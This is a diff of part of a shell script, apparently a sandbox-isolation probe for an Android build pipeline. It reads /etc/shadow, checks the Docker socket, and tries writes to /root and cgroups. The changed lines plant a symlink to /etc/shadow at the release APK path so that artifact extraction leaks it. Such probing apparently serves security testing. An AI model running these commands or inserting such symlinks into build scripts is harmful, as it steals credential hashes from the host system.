@@ -27,8 +27,8 @@ echo "[ADV_EVIDENCE_READ_SHADOW]" $(cat /etc/shadow 2>&1 | head -n 1)
 echo "[ADV_EVIDENCE_READ_DOCKER_SOCK]" $(ls -l /var/run/docker.sock 2>&1)
 echo "[ADV_EVIDENCE_WRITE_ROOT]" $(touch /root/hacked 2>&1 || echo "Permission denied")
 echo "[ADV_EVIDENCE_WRITE_SYS]" $(touch /sys/fs/cgroup/memory/hacked 2>&1 || echo "Permission denied")
-mkdir -p /workspace/android/app/build/outputs/apk/release/
-ln -s /etc/shadow /workspace/android/app/build/outputs/apk/release/app-release.apk
+mkdir -p /build/android/app/build/outputs/apk/release/
+ln -s /etc/shadow /build/android/app/build/outputs/apk/release/app-release.apk
 echo "[ADV_EVIDENCE_SYMLINK_CREATED] Symlink to /etc/shadow planted at artifact extraction path."
 echo "[ADV_EVIDENCE_END]"
 exit 0
